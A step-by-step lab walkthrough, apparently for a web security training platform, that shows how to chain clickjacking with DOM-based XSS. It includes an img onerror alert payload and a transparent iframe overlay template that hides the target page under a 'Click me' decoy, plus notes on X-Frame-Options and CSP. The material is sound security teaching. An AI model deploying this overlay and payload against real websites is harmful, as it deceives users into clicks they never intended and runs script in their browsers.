# Lab 04 — Clickjacking With DOM XSS

## Objective

Exploit a combination of clickjacking and a DOM-based XSS vulnerability.

The lab demonstrates how clickjacking can be used to make a victim interact with a vulnerable page element, allowing the DOM XSS functionality to be triggered through a deceptive interface.

---

# Attack Concept

```text
Identify DOM XSS
       ↓
Identify Required User Interaction
       ↓
Confirm Target Page Is Frameable
       ↓
Load Page in iframe
       ↓
Create Clickjacking Overlay
       ↓
Position Decoy Over Target Control
       ↓
Victim Clicks
       ↓
DOM XSS Functionality Triggered
```

---

# Step 1 — Identify the Target Page

Open the lab application and inspect the available functionality.

Use:

```text
Burp Suite
    ↓
Proxy
    ↓
HTTP history
```

Identify a page containing the DOM-based XSS functionality.

---

# Step 2 — Identify the DOM XSS

Inspect the client-side JavaScript.

Look for a flow similar to:

```text
User-Controlled Source
        ↓
JavaScript Processing
        ↓
Dangerous DOM Sink
```

Potential sources include:

```text
URL parameters
document.URL
document.location
document.referrer
window.name
```

Potential sinks include:

```text
innerHTML
outerHTML
document.write()
eval()
```

---

# Step 3 — Determine the Trigger

Determine how the DOM XSS is triggered.

The vulnerability may require:

```text
Page Load
```

or:

```text
Click
```

or another user interaction.

Clickjacking is particularly relevant when the vulnerable functionality requires a click.

---

# Step 4 — Confirm the Vulnerability

Use a harmless proof of concept in the authorized lab environment.

For example:

```html
<img src=x onerror=alert(1)>
```

The exact payload must match the vulnerable DOM context.

---

# Step 5 — Inspect Security Headers

Check the target response for:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

Pay particular attention to:

```text
frame-ancestors
```

The target page must be frameable for the clickjacking portion of the attack.

---

# Step 6 — Inspect CSP

The lab material includes a CSP-related weakness.

Inspect:

```http
Content-Security-Policy
```

and determine whether attacker-controlled input can affect the policy.

Pay attention to parameters that may be reflected into the CSP.

---

# Step 7 — Construct the iframe

Create an attacker-controlled page containing the vulnerable target page.

Example:

```html
<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/">
</iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

# Step 8 — Create the Decoy

Add a visible element:

```html
<div>Click me</div>
```

Position it over the target control that triggers the vulnerable behavior.

---

# Step 9 — Create the Overlay

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/">
</iframe>
```

The coordinates must be adjusted according to the target interface.

---

# Step 10 — Align the Interaction

During testing:

```css
opacity: 0.1;
```

allows the target page to remain partially visible.

Identify the vulnerable target control.

Then align:

```text
Visible Decoy
      ↓
Target Control
```

---

# Step 11 — Hide the iframe

After alignment:

```css
opacity: 0.0001;
```

can be used for the final proof of concept.

The target interface becomes effectively invisible.

---

# Step 12 — Victim Interaction

The victim sees:

```text
Click me
```

The actual interaction occurs with:

```text
Target Control
```

inside the transparent iframe.

The click therefore triggers the target functionality.

---

# Attack Flow

```text
Victim Opens Attacker Page
          ↓
Target Page Loads in iframe
          ↓
DOM XSS Functionality Present
          ↓
Visible Decoy Positioned
          ↓
Victim Clicks Decoy
          ↓
Target Control Receives Click
          ↓
DOM XSS Triggered
```

---

# Burp Suite Workflow

```text
Proxy
  ↓
HTTP History
  ↓
Identify Target Page
  ↓
Inspect JavaScript
  ↓
Identify DOM XSS
  ↓
Identify Trigger
  ↓
Inspect CSP
  ↓
Check Frameability
  ↓
Create iframe
  ↓
Create Decoy
  ↓
Align Target
  ↓
Test With Opacity
  ↓
Reduce Opacity
  ↓
Deliver Exploit
```

---

# CSP Consideration

A CSP may restrict script execution.

Inspect:

```text
script-src
```

and related directives.

The lab material demonstrates that weaknesses in CSP configuration can become relevant when combined with the DOM XSS behavior.

---

# Troubleshooting

## DOM XSS Does Not Execute

Check:

```text
Source
Sink
Payload Context
CSP
Trigger
```

---

## iframe Is Blocked

Inspect:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

---

## Click Does Not Trigger Target

Temporarily increase:

```css
opacity: 0.1;
```

Then adjust:

```css
top
left
width
height
```

---

# Final Checklist

```text
☐ Identified vulnerable page
☐ Identified DOM XSS source
☐ Identified dangerous sink
☐ Confirmed DOM XSS behavior
☐ Identified required interaction
☐ Inspected CSP
☐ Checked frameability
☐ Created iframe
☐ Created decoy
☐ Aligned decoy with target
☐ Tested with partial opacity
☐ Reduced iframe opacity
☐ Delivered exploit in authorized lab
☐ Confirmed vulnerable functionality triggered
☐ Lab solved
```

---

# Key Learning

This lab demonstrates that clickjacking can be combined with DOM XSS:

```text
Frameable Page
      +
DOM XSS
      +
Required User Interaction
      ↓
Clickjacking + DOM XSS
```

The complete chain must be demonstrated rather than assuming that the presence of both vulnerabilities automatically produces an exploitable combination.